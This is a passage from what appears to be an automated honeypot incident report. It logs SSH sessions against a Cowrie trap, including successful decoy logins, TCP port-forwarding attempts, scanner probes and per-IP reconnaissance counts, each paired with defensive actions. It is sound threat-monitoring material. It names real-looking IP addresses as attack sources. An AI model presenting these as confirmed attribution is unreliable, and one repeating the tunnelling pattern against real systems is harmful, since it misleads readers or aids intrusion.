| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 11:50:01` | `cowrie.session.connect` |
| `2026-08-08 11:50:02` | `cowrie.client.version` |
| `2026-08-08 11:50:02` | `cowrie.client.kex` |
| `2026-08-08 11:50:03` | `cowrie.login.success` |
| `2026-08-08 11:50:04` | `cowrie.direct-tcpip.request` |
| `2026-08-08 11:50:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.202[.]4` to AbuseIPDB if not already reported
- [ ] Block `65.20.202[.]4` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c491c912fbc1

| Field | Detail |
|---|---|
| **Source IP** | `207.219.222[.]29` |
| **First Seen** | 2026-08-08 11:53 |
| **Last Seen** | 2026-08-08 11:53 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 11:53:23` | `cowrie.session.connect` |
| `2026-08-08 11:53:23` | `cowrie.client.version` |
| `2026-08-08 11:53:23` | `cowrie.client.kex` |
| `2026-08-08 11:53:24` | `cowrie.login.success` |
| `2026-08-08 11:53:25` | `cowrie.direct-tcpip.request` |
| `2026-08-08 11:53:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.219.222[.]29` to AbuseIPDB if not already reported
- [ ] Block `207.219.222[.]29` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-654303be2efc

| Field | Detail |
|---|---|
| **Source IP** | `179.181.133[.]153` |
| **First Seen** | 2026-08-08 11:53 |
| **Last Seen** | 2026-08-08 11:53 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 11:53:30` | `cowrie.session.connect` |
| `2026-08-08 11:53:30` | `cowrie.client.version` |
| `2026-08-08 11:53:30` | `cowrie.client.kex` |
| `2026-08-08 11:53:32` | `cowrie.login.success` |
| `2026-08-08 11:53:33` | `cowrie.direct-tcpip.request` |
| `2026-08-08 11:53:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.181.133[.]153` to AbuseIPDB if not already reported
- [ ] Block `179.181.133[.]153` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09588e4cfcf0

| Field | Detail |
|---|---|
| **Source IP** | `196.219.93[.]98` |
| **First Seen** | 2026-08-08 11:57 |
| **Last Seen** | 2026-08-08 11:57 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 11:57:17` | `cowrie.session.connect` |
| `2026-08-08 11:57:18` | `cowrie.client.version` |
| `2026-08-08 11:57:18` | `cowrie.client.kex` |
| `2026-08-08 11:57:19` | `cowrie.login.success` |
| `2026-08-08 11:57:19` | `cowrie.direct-tcpip.request` |
| `2026-08-08 11:57:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.219.93[.]98` to AbuseIPDB if not already reported
- [ ] Block `196.219.93[.]98` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e993d05142b4

| Field | Detail |
|---|---|
| **Source IP** | `113.219.177[.]95` |
| **First Seen** | 2026-08-08 11:57 |
| **Last Seen** | 2026-08-08 11:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 11:57:29` | `cowrie.session.connect` |
| `2026-08-08 11:57:30` | `cowrie.client.version` |
| `2026-08-08 11:57:30` | `cowrie.client.kex` |
| `2026-08-08 11:57:32` | `cowrie.login.success` |
| `2026-08-08 11:57:32` | `cowrie.direct-tcpip.request` |
| `2026-08-08 11:57:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.219.177[.]95` to AbuseIPDB if not already reported
- [ ] Block `113.219.177[.]95` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b14762bd3e59

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-08 12:02 |
| **Last Seen** | 2026-08-08 12:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 12:02:38` | `cowrie.session.connect` |
| `2026-08-08 12:02:38` | `cowrie.client.version` |
| `2026-08-08 12:02:38` | `cowrie.client.kex` |
| `2026-08-08 12:02:38` | `cowrie.login.success` |
| `2026-08-08 12:02:38` | `cowrie.direct-tcpip.request` |
| `2026-08-08 12:02:38` | `cowrie.direct-tcpip.data` |
| `2026-08-08 12:02:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31129e248943

| Field | Detail |
|---|---|
| **Source IP** | `196.189.126[.]10` |
| **First Seen** | 2026-08-08 12:20 |
| **Last Seen** | 2026-08-08 12:20 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 12:20:15` | `cowrie.session.connect` |
| `2026-08-08 12:20:16` | `cowrie.client.version` |
| `2026-08-08 12:20:16` | `cowrie.client.kex` |
| `2026-08-08 12:20:18` | `cowrie.login.success` |
| `2026-08-08 12:20:18` | `cowrie.direct-tcpip.request` |
| `2026-08-08 12:20:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.126[.]10` to AbuseIPDB if not already reported
- [ ] Block `196.189.126[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88bac51eb013

| Field | Detail |
|---|---|
| **Source IP** | `223.107.146[.]186` |
| **First Seen** | 2026-08-08 12:20 |
| **Last Seen** | 2026-08-08 12:20 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 12:20:23` | `cowrie.session.connect` |
| `2026-08-08 12:20:24` | `cowrie.client.version` |
| `2026-08-08 12:20:24` | `cowrie.client.kex` |
| `2026-08-08 12:20:27` | `cowrie.login.success` |
| `2026-08-08 12:20:28` | `cowrie.direct-tcpip.request` |
| `2026-08-08 12:20:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.107.146[.]186` to AbuseIPDB if not already reported
- [ ] Block `223.107.146[.]186` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a523dd995a6

| Field | Detail |
|---|---|
| **Source IP** | `138.118.213[.]68` |
| **First Seen** | 2026-08-08 12:20 |
| **Last Seen** | 2026-08-08 12:20 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 12:20:24` | `cowrie.session.connect` |
| `2026-08-08 12:20:25` | `cowrie.client.version` |
| `2026-08-08 12:20:25` | `cowrie.client.kex` |
| `2026-08-08 12:20:27` | `cowrie.login.success` |
| `2026-08-08 12:20:28` | `cowrie.direct-tcpip.request` |
| `2026-08-08 12:20:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.118.213[.]68` to AbuseIPDB if not already reported
- [ ] Block `138.118.213[.]68` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-484064323f2c

| Field | Detail |
|---|---|
| **Source IP** | `65.20.179[.]251` |
| **First Seen** | 2026-08-08 12:20 |
| **Last Seen** | 2026-08-08 12:20 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 12:20:28` | `cowrie.session.connect` |
| `2026-08-08 12:20:28` | `cowrie.client.version` |
| `2026-08-08 12:20:28` | `cowrie.client.kex` |
| `2026-08-08 12:20:29` | `cowrie.login.success` |
| `2026-08-08 12:20:30` | `cowrie.direct-tcpip.request` |
| `2026-08-08 12:20:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.179[.]251` to AbuseIPDB if not already reported
- [ ] Block `65.20.179[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74f6b98b0e15

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-08 12:24 |
| **Last Seen** | 2026-08-08 12:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 12:24:43` | `cowrie.session.connect` |
| `2026-08-08 12:24:43` | `cowrie.client.version` |
| `2026-08-08 12:24:43` | `cowrie.client.kex` |
| `2026-08-08 12:24:43` | `cowrie.login.success` |
| `2026-08-08 12:24:43` | `cowrie.direct-tcpip.request` |
| `2026-08-08 12:24:43` | `cowrie.direct-tcpip.data` |
| `2026-08-08 12:24:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a867fd6bbe9

| Field | Detail |
|---|---|
| **Source IP** | `92.62.74[.]41` |
| **First Seen** | 2026-08-08 12:27 |
| **Last Seen** | 2026-08-08 12:28 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 12:27:54` | `cowrie.session.connect` |
| `2026-08-08 12:27:55` | `cowrie.client.version` |
| `2026-08-08 12:27:55` | `cowrie.client.kex` |
| `2026-08-08 12:27:56` | `cowrie.login.success` |
| `2026-08-08 12:27:56` | `cowrie.direct-tcpip.request` |
| `2026-08-08 12:28:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.62.74[.]41` to AbuseIPDB if not already reported
- [ ] Block `92.62.74[.]41` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d495fab4f4ab

| Field | Detail |
|---|---|
| **Source IP** | `218.200.9[.]182` |
| **First Seen** | 2026-08-08 12:28 |
| **Last Seen** | 2026-08-08 12:28 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 12:28:07` | `cowrie.session.connect` |
| `2026-08-08 12:28:08` | `cowrie.client.version` |
| `2026-08-08 12:28:08` | `cowrie.client.kex` |
| `2026-08-08 12:28:10` | `cowrie.login.success` |
| `2026-08-08 12:28:11` | `cowrie.direct-tcpip.request` |
| `2026-08-08 12:28:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.200.9[.]182` to AbuseIPDB if not already reported
- [ ] Block `218.200.9[.]182` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3f14dff0ffd

| Field | Detail |
|---|---|
| **Source IP** | `146.255.228[.]189` |
| **First Seen** | 2026-08-08 12:29 |
| **Last Seen** | 2026-08-08 12:29 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 12:29:47` | `cowrie.session.connect` |
| `2026-08-08 12:29:48` | `cowrie.client.version` |
| `2026-08-08 12:29:48` | `cowrie.client.kex` |
| `2026-08-08 12:29:49` | `cowrie.login.success` |
| `2026-08-08 12:29:50` | `cowrie.direct-tcpip.request` |
| `2026-08-08 12:29:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.255.228[.]189` to AbuseIPDB if not already reported
- [ ] Block `146.255.228[.]189` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-387a5bf02463

| Field | Detail |
|---|---|
| **Source IP** | `165.245.211[.]148` |
| **First Seen** | 2026-08-08 12:40 |
| **Last Seen** | 2026-08-08 12:41 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 12:40:59` | `cowrie.session.connect` |
| `2026-08-08 12:41:05` | `cowrie.login.success` |
| `2026-08-08 12:41:06` | `cowrie.session.params` |
| `2026-08-08 12:41:10` | `cowrie.log.closed` |
| `2026-08-08 12:41:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.245.211[.]148` to AbuseIPDB if not already reported
- [ ] Block `165.245.211[.]148` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7346b0814892

| Field | Detail |
|---|---|
| **Source IP** | `165.245.211[.]148` |
| **First Seen** | 2026-08-08 12:41 |
| **Last Seen** | 2026-08-08 12:41 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 12:41:16` | `cowrie.session.connect` |
| `2026-08-08 12:41:16` | `cowrie.login.success` |
| `2026-08-08 12:41:16` | `cowrie.session.params` |
| `2026-08-08 12:41:21` | `cowrie.log.closed` |
| `2026-08-08 12:41:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.245.211[.]148` to AbuseIPDB if not already reported
- [ ] Block `165.245.211[.]148` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df1afddcde61

| Field | Detail |
|---|---|
| **Source IP** | `165.245.211[.]148` |
| **First Seen** | 2026-08-08 12:41 |
| **Last Seen** | 2026-08-08 12:41 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 12:41:21` | `cowrie.session.connect` |
| `2026-08-08 12:41:21` | `cowrie.login.success` |
| `2026-08-08 12:41:21` | `cowrie.session.params` |
| `2026-08-08 12:41:26` | `cowrie.log.closed` |
| `2026-08-08 12:41:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.245.211[.]148` to AbuseIPDB if not already reported
- [ ] Block `165.245.211[.]148` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d687d783328b

| Field | Detail |
|---|---|
| **Source IP** | `165.245.211[.]148` |
| **First Seen** | 2026-08-08 12:41 |
| **Last Seen** | 2026-08-08 12:41 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 12:41:26` | `cowrie.session.connect` |
| `2026-08-08 12:41:26` | `cowrie.login.success` |
| `2026-08-08 12:41:26` | `cowrie.session.params` |
| `2026-08-08 12:41:31` | `cowrie.log.closed` |
| `2026-08-08 12:41:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.245.211[.]148` to AbuseIPDB if not already reported
- [ ] Block `165.245.211[.]148` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36febb97e524

| Field | Detail |
|---|---|
| **Source IP** | `165.245.211[.]148` |
| **First Seen** | 2026-08-08 12:42 |
| **Last Seen** | 2026-08-08 12:42 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `From: <sip:nm@nm>;tag=root, To: <sip:nm2@nm2>, Call-ID: 50000, CSeq: 42 OPTIONS, Max-Forwards: 70` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 12:42:04` | `cowrie.session.connect` |
| `2026-08-08 12:42:04` | `cowrie.login.success` |
| `2026-08-08 12:42:05` | `cowrie.session.params` |
| `2026-08-08 12:42:05` | `cowrie.command.input` |
| `2026-08-08 12:42:05` | `cowrie.command.failed` |
| `2026-08-08 12:42:05` | `cowrie.command.input` |
| `2026-08-08 12:42:05` | `cowrie.command.failed` |
| `2026-08-08 12:42:05` | `cowrie.command.input` |
| `2026-08-08 12:42:05` | `cowrie.command.failed` |
| `2026-08-08 12:42:05` | `cowrie.command.input` |
| `2026-08-08 12:42:05` | `cowrie.command.failed` |
| `2026-08-08 12:42:05` | `cowrie.command.input` |
| `2026-08-08 12:42:05` | `cowrie.command.failed` |
| `2026-08-08 12:42:05` | `cowrie.command.input` |
| `2026-08-08 12:42:05` | `cowrie.command.failed` |
| `2026-08-08 12:42:05` | `cowrie.command.input` |
| `2026-08-08 12:42:05` | `cowrie.command.failed` |
| `2026-08-08 12:42:05` | `cowrie.command.input` |
| `2026-08-08 12:42:05` | `cowrie.command.failed` |
| `2026-08-08 12:42:05` | `cowrie.command.input` |
| `2026-08-08 12:42:12` | `cowrie.log.closed` |
| `2026-08-08 12:42:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.245.211[.]148` to AbuseIPDB if not already reported
- [ ] Block `165.245.211[.]148` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95fd439186ed

| Field | Detail |
|---|---|
| **Source IP** | `165.245.241[.]157` |
| **First Seen** | 2026-08-08 12:42 |
| **Last Seen** | 2026-08-08 12:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (compatible; Odin; hxxps://docs.getodin.com/), Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 12:42:12` | `cowrie.session.connect` |
| `2026-08-08 12:42:12` | `cowrie.login.success` |
| `2026-08-08 12:42:12` | `cowrie.session.params` |
| `2026-08-08 12:42:13` | `cowrie.command.input` |
| `2026-08-08 12:42:13` | `cowrie.command.input` |
| `2026-08-08 12:42:13` | `cowrie.command.failed` |
| `2026-08-08 12:42:13` | `cowrie.command.input` |
| `2026-08-08 12:42:13` | `cowrie.command.failed` |
| `2026-08-08 12:42:13` | `cowrie.command.input` |
| `2026-08-08 12:42:13` | `cowrie.log.closed` |
| `2026-08-08 12:42:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.245.241[.]157` to AbuseIPDB if not already reported
- [ ] Block `165.245.241[.]157` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad802a6094bc

| Field | Detail |
|---|---|
| **Source IP** | `165.22.80[.]11` |
| **First Seen** | 2026-08-08 12:42 |
| **Last Seen** | 2026-08-08 12:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Go-http-client/1.1, Connection: close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 12:42:13` | `cowrie.session.connect` |
| `2026-08-08 12:42:13` | `cowrie.login.success` |
| `2026-08-08 12:42:13` | `cowrie.session.params` |
| `2026-08-08 12:42:13` | `cowrie.command.input` |
| `2026-08-08 12:42:13` | `cowrie.command.failed` |
| `2026-08-08 12:42:13` | `cowrie.command.input` |
| `2026-08-08 12:42:13` | `cowrie.command.failed` |
| `2026-08-08 12:42:13` | `cowrie.command.input` |
| `2026-08-08 12:42:13` | `cowrie.log.closed` |
| `2026-08-08 12:42:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.22.80[.]11` to AbuseIPDB if not already reported
- [ ] Block `165.22.80[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d56a2058bc4

| Field | Detail |
|---|---|
| **Source IP** | `165.22.80[.]11` |
| **First Seen** | 2026-08-08 12:42 |
| **Last Seen** | 2026-08-08 12:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Go-http-client/1.1, Connection: close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 12:42:13` | `cowrie.session.connect` |
| `2026-08-08 12:42:13` | `cowrie.login.success` |
| `2026-08-08 12:42:14` | `cowrie.session.params` |
| `2026-08-08 12:42:14` | `cowrie.command.input` |
| `2026-08-08 12:42:14` | `cowrie.command.failed` |
| `2026-08-08 12:42:14` | `cowrie.command.input` |
| `2026-08-08 12:42:14` | `cowrie.command.failed` |
| `2026-08-08 12:42:14` | `cowrie.command.input` |
| `2026-08-08 12:42:14` | `cowrie.log.closed` |
| `2026-08-08 12:42:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.22.80[.]11` to AbuseIPDB if not already reported
- [ ] Block `165.22.80[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83033378edf4

| Field | Detail |
|---|---|
| **Source IP** | `165.22.80[.]11` |
| **First Seen** | 2026-08-08 12:42 |
| **Last Seen** | 2026-08-08 12:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Go-http-client/1.1, Connection: close` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 12:42:14` | `cowrie.session.connect` |
| `2026-08-08 12:42:14` | `cowrie.login.success` |
| `2026-08-08 12:42:15` | `cowrie.session.params` |
| `2026-08-08 12:42:15` | `cowrie.command.input` |
| `2026-08-08 12:42:15` | `cowrie.command.failed` |
| `2026-08-08 12:42:15` | `cowrie.command.input` |
| `2026-08-08 12:42:15` | `cowrie.command.failed` |
| `2026-08-08 12:42:15` | `cowrie.command.input` |
| `2026-08-08 12:42:15` | `cowrie.log.closed` |
| `2026-08-08 12:42:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.22.80[.]11` to AbuseIPDB if not already reported
- [ ] Block `165.22.80[.]11` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-367e5fd7932e

| Field | Detail |
|---|---|
| **Source IP** | `101.13.5[.]50` |
| **First Seen** | 2026-08-08 12:43 |
| **Last Seen** | 2026-08-08 12:43 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-08 12:43:35` | `cowrie.session.connect` |
| `2026-08-08 12:43:36` | `cowrie.client.version` |
| `2026-08-08 12:43:36` | `cowrie.client.kex` |
| `2026-08-08 12:43:38` | `cowrie.login.success` |
| `2026-08-08 12:43:38` | `cowrie.direct-tcpip.request` |
| `2026-08-08 12:43:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.13.5[.]50` to AbuseIPDB if not already reported
- [ ] Block `101.13.5[.]50` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `165.245.211[.]148` | **10** | 2026-08-08 12:40 | 2026-08-08 12:42 | 0m | 0 | `T1592` | 🟠 MEDIUM |
| `164.92.115[.]22` | **7** | 2026-08-08 11:00 | 2026-08-08 12:46 | 4m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]165` | **6** | 2026-08-08 11:20 | 2026-08-08 11:57 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.219.32[.]239` | **4** | 2026-08-08 12:25 | 2026-08-08 12:33 | 8m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **4** | 2026-08-08 11:10 | 2026-08-08 12:29 | 0m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]122` | **3** | 2026-08-08 12:44 | 2026-08-08 12:44 | 0m | 0 | `T1592` | 🟢 LOW |
| `159.223.18[.]188` | **2** | 2026-08-08 12:42 | 2026-08-08 12:42 | 0m | 0 | `T1592` | 🟢 LOW |
| `165.245.241[.]157` | **2** | 2026-08-08 12:42 | 2026-08-08 12:42 | 0m | 0 | `T1592` | 🟢 LOW |
| `71.6.146[.]185` | **2** | 2026-08-08 11:44 | 2026-08-08 11:44 | 0m | 0 | `T1592` | 🟢 LOW |
